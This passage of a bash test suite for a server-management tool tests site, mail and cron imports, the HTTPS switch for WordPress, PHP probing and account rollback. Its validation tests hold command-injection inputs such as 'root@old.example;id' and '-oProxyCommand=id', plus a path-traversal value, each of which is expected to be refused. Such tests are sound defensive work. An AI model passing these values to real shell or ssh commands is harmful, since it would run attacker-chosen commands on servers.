assert_lacks "a password kept in the clear there is not kept here" "secret-of-the-boss" "$(cat "$_im_pw")"
assert_has "its mailbox gets a new one"                         'boss@mailonly.example:{BLF-CRYPT}$2y$05$newhash' "$(cat "$_im_pw")"
assert_has "and its mail"                                       "sync boss@mailonly.example" "$(cat "$_im_log")"
: >"$_im_log"
assert_eq  "--no-create makes no mail domain either"            "0" "$(_imf old.example --only mailonly.example --no-create)"
assert_has "and says so"                                        "mailonly.example: left out, it is not a domain here" "$(cat "$_im_out")"
assert_lacks "nothing is merged for it"                         "sync " "$(cat "$_im_log")"
: >"$_im_log"
assert_eq  "a domain that only forwards"                        "0" "$(_imf old.example --only fwdonly.example)"
assert_has "is a mail domain with its forwarder"                "fwdonly.example: 1 alias(es); it becomes a mail domain here" "$(cat "$_im_out")"
assert_has "which goes to both addresses"                       $'fwd@fwdonly.example\ta@one.example,b@two.example' "$(cat "$MAIL_ALIAS_DIR/fwdonly.example")"
assert_has "the list counts the aliases as well"                " 2 4 " "$(_imf old.example --list >/dev/null; grep 'shop.example' "$_im_out" | sed 's/  */ /g')"

: >"$_im_log"
assert_eq  "--no-mail leaves the mailboxes"                     "0" "$(_imf old.example --only shop.example --no-mail)"
assert_lacks "where they are"                                   "sync " "$(cat "$_im_log")"
assert_eq  "--only-mail for a site without a mailbox"           "0" "$(_imf old.example --only blog.example --only-mail)"
assert_has "leaves it out"                                      "blog.example: left out, it has no mailbox or alias there" "$(cat "$_im_out")"
: >"$_im_log"; printf 'only here too\n' >"$_im_d1/kept2.txt"; printf 'changed again\n' >"$_im_shop/wp-content/uploads/a.txt"
assert_eq  "--only-mail for a site that has some"               "0" "$(_imf old.example --only shop.example --only-mail)"
assert_has "brings the mail"                                    "sync info@shop.example" "$(cat "$_im_log")"
assert_eq  "and no file"                                        "changed there" "$(cat "$_im_d1/wp-content/uploads/a.txt")"
assert_lacks "nor a backup"                                     "backup" "$(cat "$_im_log")"
assert_lacks "nor a reload of the web server"                   "reload" "$(cat "$_im_log")"
assert_has "and says what it brought"                           "The mailboxes of 1 domain(s) were brought" "$(cat "$_im_out")"
# an address that is an alias here
printf 'info@panel.example\tsomebody@elsewhere.example\n' >"$MAIL_ALIAS_DIR/panel.example"
_im_users="info@panel.example"; : >"$_im_log"
mkdir -p "$_im_r/home/vmail/panel.example/info/Maildir/cur"
assert_eq  "an address that is an alias here"                   "0" "$(_imf old.example --only panel.example --only-mail)"
assert_has "stays one"                                          "info@panel.example is an alias on this server and stays one" "$(cat "$_im_out")"
assert_lacks "no mailbox is made under it"                      "info@panel.example:" "$(cat "$_im_pw")"
assert_lacks "and no mail is merged"                            "sync info@panel.example" "$(cat "$_im_log")"
_im_users="info@shop.example sales@shop.example boss@mailonly.example"
_im_sync_ok=0
assert_eq  "mail that cannot be merged fails the domain"        "1" "$(_imf old.example --only shop.example --only-mail)"
assert_has "by saying how much is missing"                      "The mail of shop.example is only partly here" "$(cat "$_im_out")"
_im_sync_ok=1
# a server without mail
_im_mail=0; : >"$_im_log"
assert_eq  "a server that runs no mail imports the site all the same" "0" "$(_imf old.example --only shop.example)"
assert_has "and says what it left"                              "and 4 alias(es) there, and this server runs no mail: they were not brought" "$(cat "$_im_out")"
assert_lacks "without trying"                                   "mailon" "$(cat "$_im_log")"
assert_eq  "--only-mail there is refused"                       "1" "$(_imf old.example --all --only-mail)"
assert_has "for that reason"                                    "This server runs no mail" "$(cat "$_im_out")"
assert_eq  "a domain that is only mail is left out there"       "0" "$(_imf old.example --only mailonly.example)"
assert_has "and nothing is imported"                            "Nothing was imported" "$(cat "$_im_out")"
# a server for mail alone
_im_mail=1; : >"$_im_log"
eval 'lib_server_mail_only() { return 0; }'
assert_eq  "a server for mail alone takes the mailboxes"        "0" "$(_imf old.example --only shop.example)"
assert_has "and says that the site stays"                       "the mailboxes are brought, the sites are not" "$(cat "$_im_out")"
assert_lacks "no site part runs there"                          "backup" "$(cat "$_im_log")"
assert_eq  "with --no-mail nothing is left for it"              "1" "$(_imf old.example --only shop.example --no-mail)"
eval 'lib_server_mail_only() { return 1; }'
assert_eq  "--no-mail and --only-mail"                          "1" "$(_imf old.example --all --no-mail --only-mail)"
assert_eq  "--only-mail and --path"                             "1" "$(_imf old.example --path /srv/x --as x.example --only-mail)"
assert_has "mail enable takes --no-dns"                         "--no-dns)" "$(declare -f lib_mail_enable_main)"
assert_has "and then writes no record"                          'if (( no_dns )); then' "$(declare -f lib_mail_enable_main)"
_im_mail=0

# an application that is no WordPress
: >"$_im_log"; _im_client_user="crmuser"; _im_d3="$SITES_ROOT/crm.example/public_html"
assert_eq  "an application with its login in its own files"    "0" "$(_imf old.example --only crm.example)"
assert_has "has its database named in the plan"                "crm.example: a new site" "$(grep 'database crmdb' "$_im_out")"
assert_has "which is dumped with the login the database takes" 'user="crmuser"' "$(cat "$TMP/im-restored-crm.example.sql")"
assert_has "and its password"                                  'password="crm-pw"' "$(cat "$TMP/im-restored-crm.example.sql")"
assert_has "the file near the top now has the login of this server" "\$db_name = 'crm_db';   // the database" "$(cat "$_im_d3/config.php")"
assert_has "its user and password too"                         "\$db_user = 'crm_user';" "$(cat "$_im_d3/config.php")$(grep -c "db_pass = 'LocalPass9';" "$_im_d3/config.php")"
assert_has "and so has the other file that named that database" '$baglanti = mysqli_connect("localhost", "crm_user", "LocalPass9", "crm_db");' "$(cat "$_im_d3/include/db.php")"
assert_eq  "a .env that named it, read as one though it was a copy that was read" \
  "DB_DATABASE=crm_db DB_USERNAME=crm_user DB_PASSWORD=LocalPass9" "$(grep '^DB_' "$_im_d3/app/.env" | tr '\n' ' ' | sed 's/ $//')"
assert_has "a file that names another database is left alone"  '$db_name = "otherdb"; $db_user = "other";' "$(cat "$_im_d3/admin/config.php")"
assert_has "and so is a library's"                             '$db_user = "vendored"' "$(cat "$_im_d3/vendor/config.php")"
assert_has "which files were changed is said"                  "is now the one of this server (crm_db), in: config.php, app/.env, include/db.php" "$(cat "$_im_out")"
assert_lacks "no password is in what is printed"               "LocalPass9" "$(cat "$_im_out")"
assert_lacks "nor the old one"                                 "crm-pw" "$(cat "$_im_out")$(cat "$LOG_FILE")"
assert_has "the files are written by the site's user"          "-u $(lib_domain_ident crm.example) -- env -C / tee $_im_d3/config.php" "$(cat "$RUNUSER_LOG")"
assert_false "no wp-config.php is made up for it"              test -e "$_im_d3/wp-config.php"
_im_client_user=""

# what goes wrong
: >"$_im_log"; _im_add_ok=0
assert_eq  "a site that cannot be added fails"          "1" "$(_imf old.example --only panel.example)"
assert_has "by name, with the way to try again"         "Not imported: panel.example" "$(cat "$_im_out")"
_im_add_ok=1; _im_dump_mode="fail"; rm -f "$TMP/im-restored-shop.example.sql"
assert_eq  "a dump that fails"                          "1" "$(_imf old.example --only shop.example)"
assert_has "is said to"                                 "The database shopdb could not be fetched" "$(cat "$_im_out")"
assert_false "and nothing is imported"                  test -e "$TMP/im-restored-shop.example.sql"
_im_dump_mode="cut"
assert_eq  "a dump that stops half way"                 "1" "$(_imf old.example --only shop.example)"
assert_has "is not complete"                            "is not complete" "$(cat "$_im_out")"
assert_false "and is not imported either"               test -e "$TMP/im-restored-shop.example.sql"
_im_dump_mode=""
_im_site prox.example proxy
assert_eq  "a proxy site here takes no files"           "0" "$(_imf old.example --path "$_im_r/var/www/html" --as prox.example)"
assert_has "and is left out"                            "prox.example: left out, it is a proxy site here" "$(cat "$_im_out")"

# the jobs a site was given, afterwards
assert_eq  "import cron lists them"                     "0" "$(_imf cron shop.example)"
assert_has "as cron has them"                           "@daily ${_im_su} cd ${SITES_ROOT}/shop.example" "$(cat "$_im_out")"
( lib_domain_state_load shop.example; D_PHP="8.2"; lib_domain_state_save ) >/dev/null 2>&1
lib_import_cron_apply shop.example
assert_has "written again, they follow the site's PHP"  "${_im_su} ${LSWS_HOME}/lsphp82/bin/php ${_im_d1}/cron.php" "$(cat "$CRON_FILE")"
assert_has "rename writes them again under the new name" 'lib_import_cron_apply "$new"' "$(declare -f lib_domain_rename_main)"
assert_has "after taking them out under the old one"    'lib_cron_remove_prefix "imported:${old}:"' "$(declare -f lib_domain_rename_main)"
assert_has "a backup carries them"                      "domain.json db.info wp.info ssl.info app-env.json cron.imported; do" "$(grep -A70 '^lib_backup_domain() {' "$ROOT/lib/backup.sh")"
assert_has "and a restore writes them into cron again"  'lib_import_cron_apply "$domain"' "$(declare -f lib_restore_main)"
assert_has "remove takes them with the site"            'lib_cron_remove_prefix "imported:${domain}:"' "$(declare -f lib_domain_remove_main)"
assert_eq  "--clear removes them"                       "0" "$(_imf cron shop.example --clear)"
assert_lacks "from cron"                                "imported:shop.example:" "$(cat "$CRON_FILE")"
assert_has "and leaves the other site's"                "imported:blog.example:" "$(cat "$CRON_FILE")"
assert_false "and from what is kept"                    test -e "$(lib_import_cron_file shop.example)"
assert_eq  "a site that was given none"                 "0" "$(_imf cron shop.example)"
assert_has "is said to have none"                       "was given no cron jobs" "$(cat "$_im_out")"
assert_eq  "a site that is not here"                    "1" "$(_imf cron nope.example)"
assert_eq  "--no-cron brings the site without them"     "0" "$(_imf old.example --only shop.example --no-mail --no-db --no-cron)"
assert_lacks "none is written"                          "imported:shop.example:" "$(cat "$CRON_FILE")"
assert_lacks "and the plan names none"                  "cron job(s)" "$(cat "$_im_out")"
# a PHP this server cannot install
rm -rf "$STATE_DIR/domains/shop.example"; _im_php_ok=0; : >"$_im_log"
assert_eq  "a site whose PHP this server cannot have"   "0" "$(_imf old.example --only shop.example --no-mail --no-db --no-cron)"
assert_has "is added on the usual one"                  "add shop.example --no-ssl --memory 1024M --www" "$(cat "$_im_log")"
assert_has "which is said"                              "shop.example runs PHP 7.4 there, which this server cannot install: it gets PHP ${PHP_VERSION}" "$(cat "$_im_out")"
_im_php_ok=1

# what is refused before anything is asked of the other server
: >"$_im_log"
assert_eq  "a server name with a command in it"         "1" "$(_imf 'root@old.example;id' --list)"
assert_has "is no server"                               "Invalid server" "$(cat "$_im_out")"
assert_eq  "nor is an option of ssh"                    "1" "$(_imf -oProxyCommand=id --list)"
assert_eq  "a path with a blank"                        "1" "$(_imf old.example --path '/a b' --as x.example)"
assert_has "is refused as one"                          "Invalid --path" "$(cat "$_im_out")"
assert_eq  "a path that climbs"                         "1" "$(_imf old.example --path /srv/../etc --as x.example)"
assert_eq  "--as without --path"                        "1" "$(_imf old.example --as x.example)"
assert_eq  "--db without --path"                        "1" "$(_imf old.example --db x)"
assert_eq  "a database name with a quote"               "1" "$(_imf old.example --path /srv/x --as x.example --db "a';b")"
assert_eq  "a name that is no domain"                   "1" "$(_imf old.example --path /srv/x --as 'x y')"
assert_eq  "nothing to bring"                           "1" "$(_imf old.example --all --no-db --no-files)"
assert_eq  "no server at all"                           "1" "$(_imf --all)"
assert_eq  "none of them reached the other server"      "" "$(cat "$_im_log")"
assert_has "the command is in the reference"            "import <[user@]host>" "$(lib_usage)"
assert_has "setup.sh knows it"                          'import)         lib_import_main' "$(cat "$ROOT/setup.sh")"

eval "$_im_orig"; eval "$_im_saved"
unset -f _im_row _im_mrow _im_php _im_lim _im_crow _im_f _im_rw _im_pick _im_dump _im_site _imf

section "renew-ssl: a WordPress installed before its certificate stops calling itself http://"
# The WordPress is a stand-in for wp-cli that keeps "home" and "siteurl" in two files.
_wh="$TMP/wphttps"; _wh_d="late-ssl.example"
_wh_fn="$(declare -f _wp lib_domain_wpcli_ensure _domain_rename_cache_clear)"; _wh_bin="$WPCLI_BIN"
WPCLI_BIN="$_wh/wp-bin"
lib_domain_wpcli_ensure() { return 0; }
_domain_rename_cache_clear() { printf 'cache-clear\n' >>"$_wh/calls"; }
_wp() {
  printf '%s\n' "$*" >>"$_wh/calls"
  case "$1 $2" in
    "option get")     [[ ! -e "$_wh/broken" ]] || return 1
                      [[ ! -e "$_wh/noisy" ]] || printf 'Notice: something a plugin says\n'
                      cat "$_wh/opt-$3" ;;
    "option update")  [[ ! -e "$_wh/readonly" ]] || return 1
                      [[ -e "$_wh/pinned" ]] || printf '%s\n' "$4" >"$_wh/opt-$3" ;;
    "search-replace "*) [[ ! -e "$_wh/nocount" ]] || return 1
                      if [[ "$2" == http://www.* ]]; then printf '0\n'; else printf '3\n'; fi ;;
  esac
  return 0
}
_wh_site() {   # home [siteurl] - a fresh site with these two stored
  rm -rf "$_wh"; mkdir -p "$_wh/home/public_html" "$STATE_DIR/domains/$_wh_d"
  : >"$_wh/calls"; : >"$_wh/wp-bin"; chmod +x "$_wh/wp-bin"
  printf '<?php // wp\n' >"$_wh/home/public_html/wp-config.php"
  printf '%s\n' "$1" >"$_wh/opt-home"; printf '%s\n' "${2:-$1}" >"$_wh/opt-siteurl"
  printf '# WordPress admin\nWP_URL=%s\nWP_ADMIN_USER=admin\nWP_PATH=%s\n' "$1" "$_wh/home/public_html" >"$STATE_DIR/domains/$_wh_d/wp.info"
}
_wh_run() {   # www(0/1) ssl(0/1) [arguments] -> what it says, then rc=<status>
  local www="$1" ssl="$2" rc=0; shift 2
  ( OPT_QUIET=0; D_DOMAIN="$_wh_d"; D_HOME="$_wh/home"; D_USER="late_ssl"; D_WWW="$www"; D_SSL="$ssl"
    lib_domain_wp_https "$@" ) 2>&1 || rc=$?
  printf 'rc=%s\n' "$rc"
}
_wh_opts()  { printf '%s %s' "$(cat "$_wh/opt-home")" "$(cat "$_wh/opt-siteurl")"; }
_wh_info()  { grep '^WP_URL=' "$STATE_DIR/domains/$_wh_d/wp.info"; }
_wh_calls() { cat "$_wh/calls"; }
_wh_count() { grep -c "$1" "$_wh/calls" || true; }

_wh_site "http://$_wh_d"
_o="$(_wh_run 0 1)"
assert_eq    "home and siteurl get https://" "https://$_wh_d https://$_wh_d" "$(_wh_opts)"
assert_has   "each is said, with what it was" "its home is now https://$_wh_d (was http://$_wh_d)" "$_o"
assert_has   "the other too" "its siteurl is now https://$_wh_d" "$_o"
assert_eq    "the address lomp keeps for credentials follows" "WP_URL=https://$_wh_d" "$(_wh_info)"
assert_eq    "and nothing else in that file changed" "WP_ADMIN_USER=admin" "$(grep '^WP_ADMIN_USER' "$STATE_DIR/domains/$_wh_d/wp.info")"
assert_has   "the pages kept from before are thrown away" "cache-clear" "$(_wh_calls)"
assert_has   "WordPress is asked without its plugins" "option get home --skip-plugins --skip-themes" "$(_wh_calls)"
assert_has   "what the posts still link to is counted" "3 place(s) in its database still say http://$_wh_d" "$_o"
assert_has   "and the command is one for the site user" "runuser -u late_ssl -- wp --path=$_wh/home/public_html search-replace 'http://$_wh_d' 'https://$_wh_d'" "$_o"
assert_eq    "the content is not rewritten: each look at it is a dry run" "$(_wh_count '^search-replace')" "$(_wh_count '^search-replace .* --dry-run --format=count')"
assert_eq    "one look, for a site without www" "1" "$(_wh_count '^search-replace')"
assert_eq    "both values were written" "2" "$(_wh_count '^option update')"
assert_has   "it ends well" "rc=0" "$_o"
: >"$_wh/calls"
_o="$(_wh_run 0 1)"
assert_eq    "a second run finds nothing to do" "0" "$(_wh_count 'option update\|cache-clear\|search-replace')"
assert_lacks "and says nothing about WordPress" "WordPress" "$_o"

_wh_site "http://www.$_wh_d"
_o="$(_wh_run 1 1)"
assert_eq    "a site whose address is the www name keeps the www" "https://www.$_wh_d https://www.$_wh_d" "$(_wh_opts)"
assert_eq    "in lomp's record too" "WP_URL=https://www.$_wh_d" "$(_wh_info)"
assert_eq    "and both names are looked for in the content" "2" "$(_wh_count '^search-replace')"
assert_lacks "a name with nothing left under it is not mentioned" "still say http://www." "$_o"
_wh_site "http://www.$_wh_d"
_o="$(_wh_run 0 1)"
assert_eq    "www. of a site that has no www is not its address" "http://www.$_wh_d http://www.$_wh_d" "$(_wh_opts)"
assert_has   "it is named and left" "its home is http://www.$_wh_d, which is not the plain address of this site; left as it is" "$_o"
assert_eq    "and so is the record" "WP_URL=http://www.$_wh_d" "$(_wh_info)"

for _wh_v in "http://$_wh_d:8080" "http://$_wh_d/blog" "http://$_wh_d.evil.example" "http://other.example" "http://sub.$_wh_d"; do
  _wh_site "$_wh_v"
  _o="$(_wh_run 1 1)"
  assert_eq  "an address somebody set is left alone: ${_wh_v}" "$_wh_v $_wh_v" "$(_wh_opts)"
  assert_lacks "nothing is written for it" "option update" "$(_wh_calls)"
  assert_lacks "and no page is thrown away" "cache-clear" "$(_wh_calls)"
  assert_eq  "the record keeps it too" "WP_URL=$_wh_v" "$(_wh_info)"
done
_wh_site "https://$_wh_d"
_o="$(_wh_run 0 1)"
assert_eq    "one that says https:// already is not touched" "0" "$(_wh_count 'option update')"
_wh_site "http://$_wh_d" "http://$_wh_d/wp"
_o="$(_wh_run 0 1)"
assert_eq    "home is the site's address and siteurl a directory: the first only" "https://$_wh_d http://$_wh_d/wp" "$(_wh_opts)"
assert_has   "the directory is named" "its siteurl is http://$_wh_d/wp, which is not the plain address" "$_o"
_wh_site "HTTP://Late-SSL.example/"
_o="$(_wh_run 0 1)"
assert_eq    "only the scheme changes: capitals and the closing slash stay" "https://Late-SSL.example/ https://Late-SSL.example/" "$(_wh_opts)"
_wh_site "http://$_wh_d"; : >"$_wh/noisy"
_o="$(_wh_run 0 1)"
assert_eq    "what a plugin prints before the value is not the value" "https://$_wh_d https://$_wh_d" "$(_wh_opts)"

# what can go wrong never fails the certificate
_wh_site "http://$_wh_d"; : >"$_wh/broken"
_o="$(_wh_run 0 1)"
assert_has   "a WordPress that cannot be asked is a warning" "WordPress could not be asked for its address" "$_o"
assert_has   "with the way to try again" "setup.sh renew-ssl $_wh_d" "$_o"
assert_has   "and no failure" "rc=0" "$_o"
assert_eq    "nothing was written" "0" "$(_wh_count 'option update')"
assert_eq    "lomp's own record is right all the same" "WP_URL=https://$_wh_d" "$(_wh_info)"
_wh_site "http://$_wh_d"; : >"$_wh/readonly"
_o="$(_wh_run 0 1)"
assert_has   "a value that cannot be written is a warning" "its home could not be set to https://$_wh_d" "$_o"
assert_has   "with the command, as the site user" "runuser -u late_ssl -- wp --path=$_wh/home/public_html option update home 'https://$_wh_d'" "$_o"
assert_has   "and no failure" "rc=0" "$_o"
assert_lacks "nothing is said to be done" "its home is now" "$_o"
_wh_site "http://$_wh_d"; : >"$_wh/pinned"
_o="$(_wh_run 0 1)"
assert_has   "an address set in wp-config.php is found out by asking again" "WordPress still gives http://$_wh_d as its home" "$_o"
assert_has   "and where to look is said" "WP_HOME and WP_SITEURL in $_wh/home/public_html/wp-config.php" "$_o"
assert_lacks "it is not called done" "its home is now" "$_o"
_wh_site "http://$_wh_d"; : >"$_wh/nocount"
_o="$(_wh_run 0 1)"
assert_eq    "a count that fails takes nothing back" "https://$_wh_d https://$_wh_d rc=0" "$(_wh_opts) $(tail -n 1 <<<"$_o")"
assert_lacks "and no number is made up" "place(s)" "$_o"
_wh_site "http://$_wh_d"; rm -f "$_wh/wp-bin"
_o="$(_wh_run 0 1)"
assert_has   "without wp-cli it is a warning" "wp-cli could not be installed" "$_o"
assert_eq    "and WordPress is not called" "" "$(_wh_calls)"

# when it does nothing at all
_wh_site "http://$_wh_d"
_o="$(_wh_run 0 0)"
assert_eq    "a site without a certificate keeps http:// everywhere" "http://$_wh_d http://$_wh_d WP_URL=http://$_wh_d" "$(_wh_opts) $(_wh_info)"
assert_eq    "and WordPress is not even asked" "" "$(_wh_calls)"
_wh_site "http://$_wh_d"
_o="$( ( OPT_DRY_RUN=1; _wh_run 0 1 ) )"
assert_eq    "a dry run changes nothing" "http://$_wh_d http://$_wh_d WP_URL=http://$_wh_d" "$(_wh_opts) $(_wh_info)"
_wh_site "http://$_wh_d"; rm -f "$_wh/home/public_html/wp-config.php"
_o="$(_wh_run 0 1)"
assert_eq    "where no WordPress is, wp-cli is not run" "" "$(_wh_calls)"
_wh_site "http://$_wh_d"
_o="$(_wh_run 0 1 keep-cache)"
assert_lacks "rename empties the page cache itself" "cache-clear" "$(_wh_calls)"
assert_eq    "and gets the addresses changed" "https://$_wh_d https://$_wh_d" "$(_wh_opts)"

# where it is called from
_wh_line() { grep -n -- "$1" <<<"$_wh_src" | head -n 1 | cut -d: -f1; }
_wh_src="$(declare -f lib_ssl_renew_main)"
assert_has   "renew-ssl does it, where nothing in it can end the command" '( lib_domain_wp_https ) ||' "$_wh_src"
assert_true  "after the site is switched to HTTPS" test "$(_wh_line 'D_SSL=1')" -lt "$(_wh_line 'lib_domain_wp_https')"
_wh_src="$(declare -f lib_domain_rename_main)"
assert_has   "rename does it for a name that is the first with a certificate" '( lib_domain_wp_https keep-cache )' "$_wh_src"
assert_true  "after the old name was rewritten" test "$(_wh_line '_domain_rename_wp "$old"')" -lt "$(_wh_line 'lib_domain_wp_https')"
assert_true  "and before the cache is emptied" test "$(_wh_line 'lib_domain_wp_https')" -lt "$(_wh_line '_domain_rename_cache_clear')"
_wh_src="$(declare -f lib_domain_add_main)"
assert_has   "add does it for a WordPress that is in the document root already" 'if (( D_SSL )); then' "$(grep -B1 'lib_domain_wp_https' <<<"$_wh_src")"
assert_has   "where nothing in it can end the add" '( lib_domain_wp_https ) ||' "$_wh_src"
assert_true  "after the certificate step" test "$(_wh_line 'lib_domain_add_ssl')" -lt "$(_wh_line 'lib_domain_wp_https')"
assert_true  "and before WordPress is installed, so a new one is not asked twice" test "$(_wh_line 'lib_domain_wp_https')" -lt "$(_wh_line 'lib_domain_wp_install')"
assert_lacks "the certificate step itself does not: rename goes through it before the database says the new name" "lib_domain_wp_https" "$(declare -f lib_domain_add_ssl)"

# in Turkish
_wh_tr() { ( LIB_LANG="tr"; lib_lang_build; lib_tr "$1"; printf '%s' "$LIB_TR" ); }
assert_eq    "what was done, in Turkish" "WordPress: home değeri artık https://$_wh_d (önceden http://$_wh_d)" "$(_wh_tr "WordPress: its home is now https://$_wh_d (was http://$_wh_d)")"
assert_eq    "a command stays a command" "Kalıcı olarak yeniden yazmak için: runuser -u u -- wp --path=/p search-replace 'http://a.example' 'https://a.example' --all-tables-with-prefix --skip-columns=guid" \
  "$(_wh_tr "To rewrite them for good: runuser -u u -- wp --path=/p search-replace 'http://a.example' 'https://a.example' --all-tables-with-prefix --skip-columns=guid")"
assert_has   "a warning too" "adresi hâlâ http:// olabilir" "$(_wh_tr "WordPress could not be asked for its address (wp-cli failed, see /var/log/x.log): it may still say http://")"
WPCLI_BIN="$_wh_bin"; eval "$_wh_fn"
unset -f _wh_site _wh_run _wh_opts _wh_info _wh_calls _wh_count _wh_line _wh_tr

# =============================================================================
section "add --www-primary: the PHP probe asks www, and a failed add takes its user back"
# With --www-primary the bare name answers every path with a 301 to www.<domain>, so a probe
# sent to the bare name got OpenLiteSpeed's redirect page, "add" said PHP was not executing
# and rolled the site back. And the rollback could not delete the user: OpenLiteSpeed had
# started the site's lsphp by then, and userdel refuses a user something runs as.
_wp="$TMP/wwwp"; mkdir -p "$_wp/home/wp.example/public_html"
lib_rollback_clear
lib_domain_state_reset
D_DOMAIN="wp.example"; D_IDENT="wp_example"; D_USER="wp_example"; D_GROUP="wp_example"
D_HOME="$_wp/home/wp.example"; D_MODE="php"; D_PHP="8.3"

assert_eq "a site without www answers under its own name"    "wp.example"     "$(lib_domain_primary_host)"
D_WWW=1
assert_eq "so does one whose www redirects to the bare name" "wp.example"     "$(lib_domain_primary_host)"
D_WWW_PRIMARY=1
assert_eq "with --www-primary it is www that answers"        "www.wp.example" "$(lib_domain_primary_host)"
D_WWW=0
assert_eq "a www-primary mark without www means nothing"     "wp.example"     "$(lib_domain_primary_host)"

# curl as the virtual host answers: the name that redirects gives a 301 page for any path
_wp_probe() {
  sleep() { return 0; }
  curl() {
    local a="" host="" redirecting=""
    printf '%s\n' "$*" >>"$_wp/curl.log"
    while (($# > 0)); do a="$1"; shift; if [[ "$a" == "-H" ]]; then host="${1#Host: }"; fi; done
    redirecting="$(cat "$_wp/redirecting")"
    if [[ "$host" == "$redirecting" ]]; then printf '<!DOCTYPE html><html style="height:100%%"><title>301 Moved Permanently</title>'; return 0; fi
    printf 'server-setup-php-ok:8.3'
  }
  if [[ "${1:-}" == "said" ]]; then lib_domain_php_probe || printf '%s' "$OLS_TEST_OUTPUT" >"$_wp/said"; return 0; fi
  lib_domain_php_probe
}
_wp_hosts() { grep -o 'Host: [^ ]*' "$_wp/curl.log" | sort -u | tr '\n' '|'; }

D_WWW=1; D_WWW_PRIMARY=1; printf 'wp.example' >"$_wp/redirecting"; : >"$_wp/curl.log"
assert_eq  "the probe of a www-primary site succeeds"         0 "$(run_isolated _wp_probe)"
assert_eq  "it asked www, and only www"                       "Host: www.wp.example|" "$(_wp_hosts)"
assert_has "for its own file"                                 "http://127.0.0.1/ss-probe-" "$(cat "$_wp/curl.log")"
assert_eq  "which is gone afterwards"                         "" "$(find "$D_HOME/public_html" -name 'ss-probe-*')"
D_WWW=1; D_WWW_PRIMARY=0; printf 'www.wp.example' >"$_wp/redirecting"; : >"$_wp/curl.log"
assert_eq  "www redirecting to the bare name: it succeeds"    0 "$(run_isolated _wp_probe)"
assert_eq  "having asked the bare name"                       "Host: wp.example|" "$(_wp_hosts)"
D_WWW=0; D_WWW_PRIMARY=0; printf 'none' >"$_wp/redirecting"; : >"$_wp/curl.log"
assert_eq  "no www at all: the bare name"                     "0Host: wp.example|" "$(run_isolated _wp_probe)$(_wp_hosts)"
# and a probe that does get a redirect page still fails, with what it got
D_WWW=1; D_WWW_PRIMARY=1; printf 'www.wp.example' >"$_wp/redirecting"; : >"$_wp/curl.log"
assert_eq  "a redirect page instead of PHP's answer is a failure" 1 "$(run_isolated _wp_probe)"
: >"$_wp/said"
assert_eq  "and says"                                         0 "$(run_isolated _wp_probe said)"
assert_has "what came back"                                   "PHP probe returned: <!DOCTYPE html>" "$(cat "$_wp/said")"
assert_has "add and rename both go through this probe"        "lib_domain_php_probe ||" "$(declare -f lib_domain_add_main)$(declare -f lib_domain_rename_main)"
assert_has "WordPress is installed under the same name"       'host="$(lib_domain_primary_host)"' "$(declare -f lib_domain_wp_install)"

# ---- the account of a failed add ---------------------------------------------------------
# a machine in files: user = the account exists, group = its group does, busy = something
# runs as it (userdel refuses then, as the real one does: "user ... is currently used by process")
_wp_sys='
  sleep()    { return 0; }
  id()       { [[ -e "$_wp/user" ]]; }
  getent()   { case "$1" in group) [[ -e "$_wp/group" ]] ;; *) [[ -e "$_wp/user" ]] && printf "%s:x:1:1::%s:/x\n" "$2" "$D_HOME" ;; esac; }
  pgrep()    { [[ -e "$_wp/busy" ]]; }
  pkill()    { printf "pkill %s\n" "$*" >>"$_wp/calls"; if [[ ! -e "$_wp/stubborn" || "$*" == *KILL* ]]; then rm -f "$_wp/busy"; fi; return 0; }
  userdel()  { printf "userdel %s\n" "$*" >>"$_wp/calls"; if [[ -e "$_wp/busy" ]]; then echo "userdel: user $1 is currently used by process 1" >&2; return 8; fi
               rm -f "$_wp/user"; if [[ ! -e "$_wp/own-group-stays" ]]; then rm -f "$_wp/group"; fi; return 0; }
  groupdel() { printf "groupdel %s\n" "$*" >>"$_wp/calls"; [[ -e "$_wp/group" ]] || return 6; [[ ! -e "$_wp/user" ]] || return 8; rm -f "$_wp/group"; }
  groupadd() { printf "groupadd %s\n" "$*" >>"$_wp/calls"; : >"$_wp/group"; }
  useradd()  { printf "useradd %s\n" "$*" >>"$_wp/calls"; : >"$_wp/user"; }'
_wp_reset() { rm -f "$_wp/user" "$_wp/group" "$_wp/busy" "$_wp/stubborn" "$_wp/own-group-stays"; : >"$_wp/calls"; local f=""; for f in "$@"; do : >"$_wp/$f"; done; }
_wp_calls() { tr '\n' '|' <"$_wp/calls"; }
_wp_drop()  { eval "$_wp_sys"; lib_domain_user_drop wp_example wp_example; }
_wp_left()  { local f="" out=""; for f in user group busy; do if [[ -e "$_wp/$f" ]]; then out+="$f "; fi; done; printf '%s' "$out"; }

_wp_reset user group
assert_eq "nothing runs as the user: it is deleted"               0 "$(run_isolated _wp_drop)"
assert_eq "asked to stop first, then userdel, and no groupdel for a group userdel took along" \
          "pkill -u wp_example|userdel wp_example|" "$(_wp_calls)"
assert_eq "nothing of it is left"                                 "" "$(_wp_left)"
_wp_reset user group busy
assert_eq "something still runs as the user: deleted all the same" 0 "$(run_isolated _wp_drop)"
assert_eq "because it was stopped before userdel"                 "pkill -u wp_example|userdel wp_example|" "$(_wp_calls)"
assert_eq "and nothing is left"                                   "" "$(_wp_left)"
_wp_reset user group busy stubborn
assert_eq "processes that ignore the request"                     0 "$(run_isolated _wp_drop)"
assert_has "are killed before userdel"                            "pkill -KILL -u wp_example|userdel wp_example|" "$(_wp_calls)"
assert_eq "and the account is gone"                               "" "$(_wp_left)"
_wp_reset user group own-group-stays
assert_eq "where userdel leaves the group"                        0 "$(run_isolated _wp_drop)"
assert_eq "groupdel removes it"                                   "pkill -u wp_example|userdel wp_example|groupdel wp_example|" "$(_wp_calls)"
assert_eq "nothing left there either"                             "" "$(_wp_left)"
_wp_reset group
assert_eq "only the group was made before the failure"            "0groupdel wp_example|" "$(run_isolated _wp_drop)$(_wp_calls)"
_wp_reset
assert_eq "neither is there: nothing to do, and no failure"       "0" "$(run_isolated _wp_drop)$(_wp_calls)"
_wp_nokill() { eval "$_wp_sys"; pkill() { return 0; }; lib_domain_user_drop wp_example wp_example; }
_wp_reset user group busy
assert_eq "a userdel that fails is a failed step, not a silent one" 1 "$(run_isolated _wp_nokill)"
assert_eq "and the group is left to the account that still has it" "user group busy " "$(_wp_left)"

# the whole way: the account is made, the run dies, the rollback takes it back while
# something runs as it
_wp_failed_add() {
  eval "$_wp_sys"
  lib_rollback_clear
  lib_domain_user_ensure
  [[ -e "$_wp/user" && -e "$_wp/group" ]] || return 3
  : >"$_wp/busy"                       # the site's lsphp, started by a request
  printf '%s\n' "${LIB_ROLLBACK_STACK[@]}" >"$_wp/steps"
  lib_rollback_run >"$_wp/said" 2>&1
}
